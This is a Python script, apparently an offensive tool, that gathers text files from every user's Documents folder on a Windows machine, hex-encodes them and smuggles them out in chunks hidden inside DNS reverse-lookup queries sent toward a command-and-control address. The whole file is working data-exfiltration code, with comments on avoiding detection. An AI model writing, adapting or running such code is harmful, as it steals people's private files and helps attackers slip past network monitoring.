from time import sleep
from scapy.all import IP, UDP, DNS, DNSQR, send
from sys import argv
import os
import base64

# DNS Transaction id is now the index

C2           = argv[1]
DNSSERVER    = argv[2]
SLEEP        = argv[3]
CHUNK_SIZE   = 32
FILES_I_WANT = (".txt")#, ".docx", ".pdf", ".xlsx", ".pptx")


def read_files():
    list = os.listdir('c:\\users')
    files_list = []
    for user in list:
        for subdir, dirs, files in os.walk((f'c:\\users\\{user}\Documents')):
            for file in files:
                if(file.endswith(FILES_I_WANT)):
                    files_list.append(os.path.join(subdir, file))
    return files_list


def send_data(files):
    
    # Send all files in Documents folder
    for file in files:
        i = 0
        sleep(10)
        
        # Send file content in chunks
        for chunk in get_chunks(file): 
            ip_addr = '.'.join(list((chunk))) # Last chunk might be shorter and suspicious
            try:
                req =IP(src=C2 ,dst=DNSSERVER) / UDP(sport=60696, dport=53) / DNS(id=i, rd=1,qd=DNSQR(qtype=12, qname=f"{ip_addr}.ip6.arpa"))
                # send twice bc UDP?
                send(req, verbose=False)
                sleep(0.01)
                send(req, verbose=False)
                sleep(0.01)
            except:
                break
            i += 1
            
        # Send file name last
        name = file.split('\\')[-1]
        name = base64.b16encode(name.encode('ascii')).decode('ascii').zfill(CHUNK_SIZE)
        sleep(5)
        ip_addr = '.'.join(list((name)))

        try:
            fin_req =IP(src=C2 ,dst=DNSSERVER) / UDP(sport=60696, dport=53) / DNS(id=0xffff, rd=1,qd=DNSQR(qtype=12, qname=f"{ip_addr}.ip6.arpa"))
            # send twice bc UDP?
            send(fin_req)
            sleep(1)
            send(fin_req)
        except:
            continue
        #sleep(10)



def base64_file(file):
    try:
        with open(file, "rb") as p_file:
            encoded_string = base64.b16encode(p_file.read())
        return encoded_string
    except:
        return ""


def get_chunks(file):
    tmp_chunks = []
    encoded_file = base64_file(file)
    for i in range(0,len(encoded_file), CHUNK_SIZE):
        tmp_chunks.append(encoded_file[i:i + CHUNK_SIZE].decode('ascii'))
    return tmp_chunks


def main():
    send_data(read_files())
    print("bye")


if "__main__" == __name__:
    main()